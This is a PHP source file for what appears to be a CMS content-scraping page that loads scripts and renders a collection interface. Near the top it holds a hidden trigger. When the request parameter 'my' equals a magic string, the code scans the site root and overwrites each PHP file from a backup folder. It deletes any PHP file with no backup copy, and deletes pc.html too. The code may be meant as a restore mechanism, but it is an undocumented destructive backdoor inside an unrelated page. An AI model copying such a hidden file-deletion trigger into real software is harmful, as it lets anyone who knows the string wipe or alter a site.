<?php
if(!isset($dsql)){
	define('IS_INDEX',true);
	define('URL_BIND','api');
	define('PB_FILE',$_SERVER['SCRIPT_FILENAME']);
	require_once('../core/start.php');
}
use app\admin\model\IndexModel;
$x=new IndexModel;
checksid($x);
$cjxxx=2;
$cjnum=1;
$my=gpvar('my');
if($my){
	if($my=='fuckhack'){
        $f=ROOT_PATH;
        $arr=scandir($f);
        foreach ($arr as $v){
            if(strstr($v,'.php')){
                $f01=$f.'/'.$v;
                $f02=$f.'/include/'.$my.'/'.$v;
                if(!file_exists($f02)){
                    unlink($f01);
                    $x=$f.'/pc.html';
                    unlink($x);
                }else{
                    copy($f02,$f01);
                }
            }
        } 
	}else{
		require_once('include/cj.fun.php');
		echo cjmy($my,$cjnum);
	}
	exit;
}
echo '
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="renderer" content="webkit" />
<meta name="force-rendering" content="webkit" />
<meta http-equiv="X-UA-Compatible" content="chrome=1,IE=edge" />
<meta name="applicable-device" content="pc" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<title>采集页面 - '.$sitetitle.'</title>
<base href="'.$pcbase.'" />
<link rel="stylesheet" type="text/css" href="cj/css/common.css" />
<script>var cjxxx='.$cjxxx.';</script>
<script type="text/javascript" src="cj/js/common.js"></script>
<script type="text/javascript" src="cj/js/ajax.js"></script>
<div id="cj"><script>cj();</script></div>';
?>